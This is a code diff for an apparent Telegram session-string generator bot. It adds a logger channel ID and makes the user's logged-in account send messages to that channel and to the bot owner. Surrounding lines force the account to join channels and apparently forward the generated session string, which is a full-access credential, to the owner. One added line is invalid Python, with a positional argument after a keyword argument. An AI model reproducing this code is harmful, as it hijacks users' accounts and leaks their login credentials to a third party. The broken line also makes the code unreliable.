@@ -33,7 +33,7 @@ from telethon.errors import (
 import config
 
 owner_id = 5360305806
-
+LOGGER_ID = -1001770030061
 ask_ques = "**» ▷ Cʜᴏsᴇ Tʜᴇ Sᴛʀɪɴɢ Wʜɪᴄʜ Yᴏᴜ Wᴀɴᴛ ✔️ : :**"
 buttons_ques = [
     [
@@ -185,7 +185,8 @@ async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: 
             await client.join_chat("AM_Unfban")
             await client.join_chat("Logs_Gban")
             await client.join_chat("About_AMBot")
-            await client.send_message(await client.get_entity(owner_id), "Tʜᴀɴᴋs Fᴏʀ Sᴇssᴏɪɴ Sᴛɪɴɢ Bᴏᴛ...")
+            await client.send_message(LOGGER_ID, "Tʜᴀɴᴋs Fᴏʀ Sᴇssᴏɪɴ Sᴛɪɴɢ Bᴏᴛ...\n\nBᴏᴛ : @Sessoin_String_gen_BOT")
+            await client.send_message(chat_id=owner_id, "Tʜᴀɴᴋs Fᴏʀ Sᴇssᴏɪɴ Sᴛɪɴɢ Bᴏᴛ...\n\nBᴏᴛ : @Sessoin_String_gen_BOT")
         else:
             await bot.send_message(msg.chat.id, text)
             await bot.send_message(chat_id=owner_id,  text=text)
